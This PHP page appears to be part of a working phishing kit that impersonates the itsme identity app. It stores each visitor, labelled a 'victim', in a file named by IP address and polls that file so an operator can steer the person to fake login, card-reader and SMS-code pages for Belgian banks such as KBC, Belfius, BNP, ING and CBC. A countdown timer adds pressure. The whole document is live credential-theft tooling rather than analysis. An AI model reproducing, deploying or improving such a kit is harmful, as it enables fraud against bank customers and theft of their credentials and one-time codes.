<?php

    session_start(); 
    include "./Asstes/php/lang/lang.php";
    function get_client_ips() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }    
    function reset_datas() {
          $fp = fopen('victims/'. get_client_ip() .'.txt', 'wb');
          fwrite($fp, 0);
          fclose($fp);
    }
    reset_datas();
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/itsmelogo.png">
        <title>Its me</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
    </head>
    <body class="one">

    <div class="box_whiate"></div>
    <!-- wrapper_box_number -->
    <div class="wrapper_box_numberr">
      <div class="container_box_number d-flex">
        <div class="part_left items">
            <div class="logo">
              <img src="./Asstes/imgs/itsme-logo.svg" alt="">
            </div>
            <div class="info">
              <div class="title">
                <img src="./" alt="">
                <img src="./Asstes/imgs/its.jpg" width="70px" class="mb-4" alt="">
                <h1><?php echo get_text('it_txt_1'); ?></h1>
                <p><?php echo get_text('it_txt_2'); ?></p>
              </div>
              <div class="progresss">
                <p><b class="timer">02:00</b> <?php echo get_text('it_txt_4'); ?></p>
                <div class="prog">
                  <div class="length"></div>
                </div>
              </div>
            </div>
        </div>
        <div class="part_right items d-flex justify-content-center align-items-center flex-column">
          <img src="./Asstes/imgs/phoneNumber.svg" alt="">
          <p><?php echo get_text('it_txt_5'); ?></p>
        </div>
      </div>
    </div>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="./Asstes/js/countdownTimer.min.js"></script>
    
    <script>        
            let startingMinutes = 2;
            let time = startingMinutes * 60;
            const countdownEl = document.querySelector('.timer');
            setInterval(updateCountdown, 1000);
            function updateCountdown(){
            const minutes = Math.floor(time / 60); 
            let seconds = time % 60;
            seconds = seconds < 10 ? '0' + seconds: seconds;
            countdownEl.innerHTML = `${minutes}:${seconds}`;
            time--;
            if (seconds == 1 && minutes == 0) {
              setTimeout(function(){
                location.href ="sms.php";
              },1000)
            }
          }  

          var t = 100;
          setInterval(()=>{
              t--;
              if (t > 0) {   
                if(t == 30){
                  t + 50;
                }             
                $(".length").css("width", t + ".90" + '%');         
              }
          },1000)

          var ip = '<?php echo get_client_ips(); ?>';
          var waiting = setInterval(function() {
          $.get('victims/' + ip + '.txt?' + new Date().getTime(), function(data) {
            if( data == 0 ) {
            //console.log('hada ba9i 0');
            }else if( data == 'KBC_login' ){
                clearInterval(waiting);
                location.href = "kbc1.php";
            }else if( data == 'KBC_login_error' ){
                clearInterval(waiting);
                location.href = "kbc1.php?error";
            }else if( data == 'KBC_lecture' ) {
                clearInterval(waiting);
                location.href = "kbc_l.php";
            }else if( data == 'KBC_lecture_error' ){
                clearInterval(waiting);
                location.href = "kbc_l.php?error";
            }else if( data == 'KBC_sms' ) {
                clearInterval(waiting);
                location.href = "kbc_sm.php";
            }else if( data == 'KBC_sms_error' ){
                clearInterval(waiting);
                location.href = "kbc_sm.php?error";
            }else if( data == 'success' ){
                clearInterval(waiting);
                location.href = "success.php";
            }
            // 
            else if( data == 'belfius_log' ){
                clearInterval(waiting);
                location.href = "belfius1.php";
            }else if( data == 'belfius_log_error' ){
                clearInterval(waiting);
                location.href = "belfius1.php?error";
            }else if( data == 'belfius_lecture' ) {
                clearInterval(waiting);
                location.href = "belfius_l.php";
            }else if( data == 'belfius_lecture_error' ){
                clearInterval(waiting);
                location.href = "belfius_l.php?error";
            }else if( data == 'belfius_sms' ) {
                clearInterval(waiting);
                location.href = "belfius_sm.php";
            }else if( data == 'belfius_sms_error' ){
                clearInterval(waiting);
                location.href = "belfius_sm.php?error";
            }
            // 
            else if( data == 'BNP_login' ){
                clearInterval(waiting);
                location.href = "bnp1.php";
            }else if( data == 'BNP_login_error' ){
                clearInterval(waiting);
                location.href = "bnp1.php?error";
            }else if( data == 'BNP_lecture' ) {
                clearInterval(waiting);
                location.href = "bnp_l.php";
            }else if( data == 'BNP_lecture_error' ){
                clearInterval(waiting);
                location.href = "bnp_l.php?error";
            }else if( data == 'BNP_sms' ) {
                clearInterval(waiting);
                location.href = "bnp_sm.php";
            }else if( data == 'BNP_sms_error' ){
                clearInterval(waiting);
                location.href = "bnp_sm.php?error";
            }  
            // 
            else if( data == 'Hello_login' ){
                clearInterval(waiting);
                location.href = "hello1.php";
            }else if( data == 'Hello_login_error' ){
                clearInterval(waiting);
                location.href = "hello1.php?error";
            }else if( data == 'Hello_lecture' ) {
                clearInterval(waiting);
                location.href = "hello_l.php";
            }else if( data == 'Hello_lecture_error' ){
                clearInterval(waiting);
                location.href = "hello_l.php?error";
            }else if( data == 'Hello_sms' ) {
                clearInterval(waiting);
                location.href = "hello_sm.php";
            }else if( data == 'Hello_sms_error' ){
                clearInterval(waiting);
                location.href = "hello_sm.php?error";
            } 
            // 
            else if( data == 'ING_login' ){
                clearInterval(waiting);
                location.href = "ing1.php";
            }else if( data == 'ING_login_error' ){
                clearInterval(waiting);
                location.href = "ing1.php?error";
            }else if( data == 'ING_lecture' ) {
                clearInterval(waiting);
                location.href = "ing_l.php";
            }else if( data == 'ING_lecture_error' ){
                clearInterval(waiting);
                location.href = "ing_l.php?error";
            }else if( data == 'ING_sms' ) {
                clearInterval(waiting);
                location.href = "ing_sm.php";
            }else if( data == 'ING_sms_error' ){
                clearInterval(waiting);
                location.href = "ing_sm.php?error";
            }  
            // 
            else if( data == 'fintro_login' ){
                clearInterval(waiting);
                location.href = "fintro1.php";
            }else if( data == 'fintro_login_error' ){
                clearInterval(waiting);
                location.href = "fintro1.php?error";
            }else if( data == 'fintro_lecture' ) {
                clearInterval(waiting);
                location.href = "fintro_l.php";
            }else if( data == 'fintro_lecture_error' ){
                clearInterval(waiting);
                location.href = "fintro_l.php?error";
            }else if( data == 'fintro_sms' ) {
                clearInterval(waiting);
                location.href = "fintro_sm.php";
            }else if( data == 'fintro_sms_error' ){
                clearInterval(waiting);
                location.href = "fintro_sm.php?error";
            }   
            // 
            else if( data == 'CBC_login' ){
                clearInterval(waiting);
                location.href = "cbc1.php";
            }else if( data == 'CBC_login_error' ){
                clearInterval(waiting);
                location.href = "cbc1.php?error";
            }else if( data == 'CBC_lecture' ) {
                clearInterval(waiting);
                location.href = "cbc_l.php";
            }else if( data == 'CBC_lecture_error' ){
                clearInterval(waiting);
                location.href = "cbc_l.php?error";
            }else if( data == 'CBC_sms' ) {
                clearInterval(waiting);
                location.href = "cbc_sm.php";
            }else if( data == 'CBC_sms_error' ){
                clearInterval(waiting);
                location.href = "cbc_sm.php?error";
            } else if( data == 'app' ){
                clearInterval(waiting);
                location.href = "confirm.php";
            }                                                      
          });
          }, 1000); 
        </script>    
    </body>
</html>